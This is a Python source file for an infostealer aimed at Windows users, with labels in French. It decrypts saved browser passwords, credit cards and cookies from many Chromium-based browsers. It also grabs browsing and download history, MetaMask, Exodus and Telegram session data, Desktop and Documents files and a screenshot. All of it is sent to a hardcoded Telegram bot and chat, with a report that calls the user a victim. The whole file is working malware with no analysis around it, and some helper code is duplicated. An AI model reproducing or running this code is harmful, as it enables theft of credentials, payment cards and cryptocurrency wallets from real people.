import os
import subprocess
import importlib.util

required_modules = [
    'shutil', 'sqlite3', 'zipfile', 'getpass', 'requests', 'tempfile',
    'pycountry', 'pyautogui', 'pycryptodome', 'pycryptodomex', 'pywin32', 'Crypto', 'base64'
]

installed_modules = []

for module_name in required_modules:
    spec = importlib.util.find_spec(module_name)
    if spec is not None:
        installed_modules.append(module_name)

missing_modules = [module_name for module_name in required_modules if module_name not in installed_modules]
if missing_modules:
    for module_name in missing_modules:
        subprocess.run(['pip', 'install', module_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        installed_modules.append(module_name)

import glob
import json
import base64
import shutil
import sqlite3   
import zipfile
import getpass
import requests
import tempfile
import pycountry
import pyautogui
from datetime import datetime
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData

appdata = os.getenv('LOCALAPPDATA')
user = os.path.expanduser("~")

browsers = {
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
    'chromium': appdata + '\\Chromium\\User Data',
    'opera': appdata + '\\Opera Software\\Opera Stable',
}

username = getpass.getuser()
ip_address = requests.get('https://api.ipify.org').text
response = requests.get(f'http://ip-api.com/json/{ip_address}')
country_code = response.json().get('countryCode', '')
country = pycountry.countries.get(alpha_2=country_code)
isp = response.json().get('isp', '')

extensions_folder = f"C:\\Users\\{getpass.getuser()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions"
has_metamask = 'nkbihfbeogaeaoehlefnkodbefgpgknn' in os.listdir(extensions_folder)
has_exodus = os.path.exists(os.path.join(os.getenv('APPDATA'), 'Exodus'))
has_ledger = os.path.exists(os.path.join(os.getenv('APPDATA'), 'Ledger Live'))
has_telegram = os.path.exists(os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata'))

TELEGRAM_TOKEN = '6572131644:AAEYf5wTiv4WcyqgeGjQWA3aqoJkHMy4QbY'
TELEGRAM_CHAT_ID_NOTIF = '-1001928332499'
TELEGRAM_CHAT_ID = '-1001928332499'

def send_notification_telegram(message):
    try:
        url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
        params = {'chat_id': TELEGRAM_CHAT_ID_NOTIF, 'text': message}
        requests.post(url, data=params)
    except:
        pass

def send_telegram_file(zip_file_path):
    try:
        with open(zip_file_path, "rb") as f:
            file_size = os.path.getsize(zip_file_path)

            if file_size > 50 * 1024 * 1024:
                chunk_size = 50 * 1024 * 1024  
                total_chunks = (file_size // chunk_size) + 1

                for chunk_number in range(total_chunks):
                    start = chunk_number * chunk_size
                    end = min(start + chunk_size, file_size)

                    chunk_data = f"{chunk_number+1}/{total_chunks} - {zip_file_path}"
                    payload = {"document": (zip_file_path, f, "application/zip")}
                    response = requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
                        files=payload,
                        data={"chat_id": TELEGRAM_CHAT_ID},
                    )

                    if response.status_code != 200:
                        pass  

    except Exception as e:
        pass

def exodus_search_and_send():
    exodus_path = os.path.join(user, "AppData", "Roaming", "Exodus")
    if os.path.exists(exodus_path):
        try:
            temp_dir = tempfile.mkdtemp()
            shutil.copytree(exodus_path, os.path.join(temp_dir, "Exodus"))

            zip_file_path = os.path.join(temp_dir, "Exodus.zip")
            shutil.make_archive(os.path.join(temp_dir, "Exodus"), "zip", temp_dir)

            if os.path.exists(zip_file_path):
                with open(zip_file_path, "rb") as f:
                    payload = {"document": (zip_file_path, f, "application/zip")}
                    response = requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
                        files=payload,
                        data={"chat_id": TELEGRAM_CHAT_ID},
                    )

                    if response.status_code != 200:
                        pass 

            try:
                os.remove(zip_file_path)
                shutil.rmtree(temp_dir)
            except Exception as e:
                pass  

        except Exception as e:
            pass 

def search_and_send_files():
    try:
        desktop_path = os.path.join(user, "Desktop")
        documents_path = os.path.join(user, "Documents")
        temp_zip_folder = os.path.join(user, "AppData", "Local", "Temp", "FoundFiles")

        os.makedirs(temp_zip_folder, exist_ok=True)

        file_extensions = [".zip", ".rar", ".txt", ".pdf"]
        found_files = []

        for root_folder in [desktop_path, documents_path]:
            for foldername, _, filenames in os.walk(root_folder):
                for filename in filenames:
                    if any(filename.lower().endswith(ext) for ext in file_extensions):
                        found_files.append(os.path.join(foldername, filename))

        if found_files:
            for idx, file_path in enumerate(found_files, start=1):
                shutil.copy(file_path, temp_zip_folder)

            temp_zip_path = os.path.join(user, "AppData", "Local", "Temp", "FoundFiles.zip")
            shutil.make_archive(temp_zip_path[:-4], "zip", temp_zip_folder)

            if os.path.exists(temp_zip_path):
                with open(temp_zip_path, "rb") as f:
                    payload = {"document": (temp_zip_path, f, "application/zip")}
                    response = requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
                        files=payload,
                        data={"chat_id": TELEGRAM_CHAT_ID},
                    )

                    if response.status_code != 200:
                        pass  

                try:
                    os.remove(temp_zip_path)
                    shutil.rmtree(temp_zip_folder)
                except Exception as e:
                    pass  

        else:
            pass  

    except Exception as e:
        pass

def metamask(args, brow, count):
    try:
        if os.path.exists(args):
            shutil.copytree(args, user+f"\\AppData\\Local\\Temp\\Metamask_{brow}")
    except shutil.Error: 
        pass
    try:
        shutil.make_archive(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}", "zip", user+f"\\AppData\\Local\\Temp\\Metamask_{brow}")

        zip_file_path = user + f"\\AppData\\Local\\Temp\\Metamask_{brow}.zip"
        if os.path.exists(zip_file_path):
            with open(zip_file_path, "rb") as f:
                payload = {"document": (zip_file_path, f, "application/zip")}
                response = requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
                    files=payload,
                    data={"chat_id": TELEGRAM_CHAT_ID},
                )

                if response.status_code != 200:
                    pass  

        try:
            os.remove(zip_file_path)
            shutil.rmtree(user + f"\\AppData\\Local\\Temp\\Metamask_{brow}")
        except Exception as e:
            pass  

    except Exception as e:
        pass 

def metamask_search():
    meta_paths = [
        [f"{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm", "Edge"],
        [f"{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn", "Edge"],
        [f"{user}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn", "Brave"],
        [f"{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn", "Google"],
        [f"{user}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn", "OperaGX"]
    ]

    count = 0
    try:
        for path, browser in meta_paths:
            if os.path.exists(path):
                metamask(path, browser, count) 
                count += 1
    except Exception as e:
        pass

def telegram():
    if os.path.exists(user + "\\AppData\\Roaming\\Telegram Desktop\\tdata"):
        try:
            tdata_dir = user + "\\AppData\\Roaming\\Telegram Desktop\\tdata"
            user_data_dirs = [f for f in os.listdir(tdata_dir) if os.path.isdir(os.path.join(tdata_dir, f)) and f.startswith("user_data")]

            ignore_items = shutil.ignore_patterns(*user_data_dirs, "emoji", "working")

            with tempfile.TemporaryDirectory() as temp_dir:
                shutil.copytree(
                    tdata_dir,
                    os.path.join(temp_dir, "tdata_session"),
                    ignore=ignore_items,
                )

                zip_file_path = os.path.join(temp_dir, "tdata_session.zip")
                shutil.make_archive(
                    os.path.join(temp_dir, "tdata_session"),
                    "zip",
                    os.path.join(temp_dir, "tdata_session"),
                )

                if os.path.exists(zip_file_path):
                    with open(zip_file_path, "rb") as f:
                        payload = {"document": (zip_file_path, f, "application/zip")}
                        response = requests.post(
                            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
                            files=payload,
                            data={"chat_id": TELEGRAM_CHAT_ID},
                        )
                        if response.status_code == 200:
                            os.remove(zip_file_path)
        except:
            pass

def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_password(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass

def installed_browsers():
    results = []
    for browser, path in browsers.items():
        if os.path.exists(path):
            results.append(browser)
    return results

def get_login_data(path: str, profile: str, master_key):
    login_db = f'{path}\\{profile}\\Login Data'
    if not os.path.exists(login_db):
        return
    result = ""
    shutil.copy(login_db, user+'\\AppData\\Local\\Temp\\login_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\login_db')
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    for row in cursor.fetchall():
        password = decrypt_password(row[2], master_key)
        result += f"""
        URL: {row[0]}
        Email: {row[1]}
        Password: {password}
        
        """
    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\login_db')
    return result

def get_credit_cards(path: str, profile: str, master_key):
    cards_db = f'{path}\\{profile}\\Web Data'
    if not os.path.exists(cards_db):
        return

    result = ""
    shutil.copy(cards_db, user+'\\AppData\\Local\\Temp\\cards_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\cards_db')
    cursor = conn.cursor()
    cursor.execute(
        'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        card_number = decrypt_password(row[3], master_key)
        result += f"""
        Name Card: {row[0]}
        Card Number: {card_number}
        Expires:  {row[1]} / {row[2]}
        Added: {datetime.fromtimestamp(row[4])}
        
        """

    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\cards_db')
    return result

def get_cookies(path: str, profile: str, master_key):
    cookie_db = f'{path}\\{profile}\\Network\\Cookies'
    if not os.path.exists(cookie_db):
        return
    result = ""
    shutil.copy(cookie_db, user+'\\AppData\\Local\\Temp\\cookie_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\cookie_db')
    cursor = conn.cursor()
    cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        cookie = decrypt_password(row[3], master_key)

        result += f"""
        Host Key : {row[0]}
        Cookie Name : {row[1]}
        Path: {row[2]}
        Cookie: {cookie}
        Expires On: {row[4]}
        
        """

    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\cookie_db')
    return result

def get_web_history(path: str, profile: str):
    web_history_db = f'{path}\\{profile}\\History'
    result = ""
    if not os.path.exists(web_history_db):
        return

    shutil.copy(web_history_db, user+'\\AppData\\Local\\Temp\\web_history_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\web_history_db')
    cursor = conn.cursor()
    cursor.execute('SELECT url, title, last_visit_time FROM urls')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2]:
            continue
        result += f"""
        URL: {row[0]}
        Title: {row[1]}
        Visited Time: {row[2]}
        
        """
    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\web_history_db')
    return result

def get_downloads(path: str, profile: str):
    downloads_db = f'{path}\\{profile}\\History'
    if not os.path.exists(downloads_db):
        return
    result = ""
    shutil.copy(downloads_db, user+'\\AppData\\Local\\Temp\\downloads_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\downloads_db')
    cursor = conn.cursor()
    cursor.execute('SELECT tab_url, target_path FROM downloads')
    for row in cursor.fetchall():
        if not row[0] or not row[1]:
            continue
        result += f"""
        Download URL: {row[0]}
        Local Path: {row[1]}
        
        """

    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\downloads_db')

def send_screenshot_telegram(message):
    try:
        screenshot = pyautogui.screenshot()
        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as f:
            screenshot.save(f.name)
            file_name = f.name

        with open(file_name, 'rb') as photo:
            files = {'photo': photo}
            url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto'
            params = {'chat_id': TELEGRAM_CHAT_ID, 'caption': message}
            response = requests.post(url, files=files, data=params)

        os.remove(file_name)

        if response.status_code == 200:
            return True
        else:
            print("Erreur lors de l'envoi du screenshot via Telegram.")
            return False
    except Exception as e:
        print(f"Erreur lors de l'envoi du screenshot via Telegram : {e}")
        return False

def zip_files():
    zip_file_name = user+'\\AppData\\Local\\Temp\\Browser_Data.zip'
    with zipfile.ZipFile(zip_file_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(user+'\\AppData\\Local\\Temp\\Browser'):
            for file in files:
                zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), user+'\\AppData\\Local\\Temp\\Browser'))

    return zip_file_name

def send_telegram_file(file_path):
    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as file:
            files = {'document': file}
            data = {
                "chat_id": TELEGRAM_CHAT_ID,
            }
            requests.post(telegram_url, files=files, data=data)
    except:
        pass

def mainpass():
    victim_id = getpass.getuser()
    available_browsers = installed_browsers()
    total_browsers = len(available_browsers)  
    total_passwords = 0  
    saved_passwords = "" 

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)

        login_data = get_login_data(browser_path, "Default", master_key)
        if login_data:
            save_results(browser, 'Saved_Passwords', login_data)
            saved_passwords += login_data  
            num_passwords = login_data.count("Password:")  
            total_passwords += num_passwords
        
        credit_cards_data = get_credit_cards(browser_path, "Default", master_key)
        if credit_cards_data:
            save_results(browser, 'Saved_Credit_Cards', credit_cards_data)
        
        
        web_history_data = get_web_history(browser_path, "Default")
        if web_history_data:
            save_results(browser, 'Browser_History', web_history_data)
        
        downloads_data = get_downloads(browser_path, "Default")
        if downloads_data:
            save_results(browser, 'Download_History', downloads_data)

    message = f"𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 :\n\n► 𝗨𝗧𝗜𝗟𝗜𝗦𝗔𝗧𝗘𝗨𝗥 : {username}\n► 𝗣𝗔𝗬𝗦 : {country.name if country else ''}\n► 𝗜𝗣 𝗔𝗗𝗥𝗘𝗦𝗦𝗘 : {ip_address}\n► 𝗜𝗦𝗣 : {isp}\n\n𝗗𝗘𝗧𝗘𝗖𝗧𝗢𝗥 :\n\n"

    if has_telegram:
        message += "► 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 : ✅\n"
    if has_ledger:
        message += "► 𝗟𝗘𝗗𝗚𝗘𝗥 : ✅\n"
    if has_exodus:
        message += "► 𝗘𝗫𝗢𝗗𝗨𝗦 : ✅\n"
    if has_metamask:
        message += "► 𝗠𝗘𝗧𝗔𝗠𝗔𝗦𝗞 : ✅\n"

    message += f"\n🔒 𝗡𝗔𝗩𝗜𝗚𝗔𝗧𝗘𝗨𝗥 𝗦𝗧𝗘𝗔𝗟𝗘𝗥 𝗥𝗘𝗣𝗢𝗥𝗧 🔒\n\n► 𝗡𝗔𝗩𝗜𝗚𝗔𝗧𝗘𝗨𝗥 : {total_browsers}\n► 𝗠𝗢𝗧 𝗗𝗘 𝗣𝗔𝗦𝗦𝗘 : {total_passwords}"

    send_screenshot_telegram(message)
    zip_file = zip_files()
    send_telegram_file(zip_file)

    metamask_search()
    telegram()
    exodus_search_and_send()
    search_and_send_files()
    completion_message = "✅ Victime stealer avec succès ► (ID: {victim_id})"
    send_notification_telegram(completion_message)

def save_results(browser_name, data_type, content):
    if not os.path.exists(user+'\\AppData\\Local\\Temp\\Browser'):
        os.mkdir(user+'\\AppData\\Local\\Temp\\Browser')
    if not os.path.exists(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}'):
        os.mkdir(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}')
    if content is not None:
        file_path = user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}\\{data_type}.txt'
        with open(file_path, 'w', encoding="utf-8") as file:
            file.write(content)

def connectorapipy():
    victim_id = getpass.getuser()
    available_browsers = installed_browsers()
    total_browsers = len(available_browsers)  
    total_passwords = 0 
    saved_passwords = ""  

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)

        login_data = get_login_data(browser_path, "Default", master_key)
        if login_data:
            save_results(browser, 'Saved_Passwords', login_data)
            saved_passwords += login_data  
            num_passwords = login_data.count("Password:")  
            total_passwords += num_passwords
        
        credit_cards_data = get_credit_cards(browser_path, "Default", master_key)
        if credit_cards_data:
            save_results(browser, 'Saved_Credit_Cards', credit_cards_data)
        
        web_history_data = get_web_history(browser_path, "Default")
        if web_history_data:
            save_results(browser, 'Browser_History', web_history_data)
        
        downloads_data = get_downloads(browser_path, "Default")
        if downloads_data:
            save_results(browser, 'Download_History', downloads_data)

    message = f"𝗜𝗡𝗙𝗢𝗥𝗠𝗧𝗜𝗢𝗡 :\n\n► 𝗨𝗧𝗜𝗟𝗜𝗦𝗔𝗧𝗘𝗨𝗥 : {username}\n► 𝗣𝗔𝗬𝗦 : {country.name if country else ''}\n► 𝗜𝗣 𝗔𝗗𝗥𝗘𝗦𝗦𝗘 : {ip_address}\n► 𝗜𝗦𝗣 : {isp}\n\n𝗗𝗘𝗧𝗘𝗖𝗧𝗢𝗥 :\n\n"

    if has_telegram:
        message += "► 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 : ✅\n"
    if has_ledger:
        message += "► 𝗟𝗘𝗗𝗚𝗘𝗥 : ✅\n"
    if has_exodus:
        message += "► 𝗘𝗫𝗢𝗗𝗨𝗦 : ✅\n"
    if has_metamask:
        message += "► 𝗠𝗘𝗧𝗔𝗠𝗔𝗦𝗞 : ✅\n"

    message += f"\n🔒 𝗡𝗔𝗩𝗜𝗚𝗔𝗧𝗘𝗨𝗥 𝗦𝗧𝗘𝗔𝗟𝗘𝗥 𝗥𝗘𝗣𝗢𝗥𝗧 🔒\n\n► 𝗡𝗔𝗩𝗜𝗚𝗔𝗧𝗘𝗨𝗥 : {total_browsers}\n► 𝗠𝗢𝗧 𝗗𝗘 𝗣𝗔𝗦𝗦𝗘 : {total_passwords}"

    send_screenshot_telegram(message)
    
    zip_file = zip_files()
    send_telegram_file(zip_file)

    metamask_search()
    telegram()
    search_and_send_files()  
    exodus_search_and_send()
    completion_message = f"✅ Victime stealer avec succès ► (ID: {victim_id})"
    send_notification_telegram(completion_message)

if __name__ == "__main__":
    connectorapipy()